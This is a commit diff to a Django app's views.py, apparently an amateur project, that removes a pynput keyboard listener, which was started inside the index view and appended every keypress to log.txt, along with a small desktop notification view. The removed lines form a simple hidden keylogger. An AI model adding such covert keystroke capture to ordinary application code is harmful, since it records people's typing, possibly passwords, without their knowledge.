85a53c20d904708a7585d033175df89607bfd0d4
Dhanush b Mohan <65810261+dhanushbmohan7@users.noreply.github.com>
2021-06-05 10:26:18 +0530

    Update views.py

--- firstapp/views.py
+++ firstapp/views.py
@@ -1,22 +1,13 @@
 from django.shortcuts import render
 from .models import Demo
-import plyer
-# Create your views here.
 
-from pynput.keyboard import Listener
 
-def writekey(key):
-       keydata =str(key)
-       keydata=keydata.replace("'"," ")
-       with open('log.txt' , 'a') as f:
-           f.write(keydata)
+
 
                 
 def index(request):
     all=Demo.objects.all()
-    with Listener(on_press=writekey) as l:
-        
-        l.join()
+    
 
 
     return render(request,'index.html',{'all':all})
@@ -33,10 +24,7 @@ def profile(request,id):
     person=Demo.objects.get(id=id)
 
     return render(request,'profile.html',{'name':person.name,'age':person.age,'pic':person.image1})  
-def notif(request):
-    title='demo'
-    notification.notify(title=title,message='this is a demo')
-    return redirect('index')
+
 
 def search(request):
     if request.method == 'GET':
